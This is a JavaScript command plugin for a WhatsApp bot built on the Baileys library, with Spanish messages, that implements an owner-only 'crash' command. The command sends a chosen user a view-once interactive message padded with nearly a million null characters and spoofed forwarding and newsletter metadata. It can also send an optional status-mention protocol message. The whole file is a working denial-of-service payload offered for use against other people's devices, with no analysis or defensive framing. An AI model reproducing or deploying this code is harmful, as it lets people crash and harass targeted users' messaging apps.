import crypto from 'crypto'
import { generateWAMessageFromContent } from '@whiskeysockets/baileys'

let handler = async (m, { conn, args }) => {
  let isTarget = m.quoted?.sender || m.mentionedJid?.[0] || m.chat
  let mention = args.includes('-m')

  if (!isTarget) {
    return m.reply('Debes mencionar o responder a alguien para hacer crash.')
  }

  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
          },
          nativeFlowResponseMessage: {
            name: "flex_agency",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {})

  // Enviamos directamente el mensaje al objetivo
  await conn.relayMessage(isTarget, msg.message, {
    messageId: msg.key.id
  })

  // Si se pidió, se envía una "mención de estado"
  if (mention) {
    await conn.relayMessage(isTarget, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" }
            }
          ]
        }
      }
    }, {})
  }

  m.reply('Crash enviado')
}

handler.command = ['crash']
handler.owner = true

export default handler
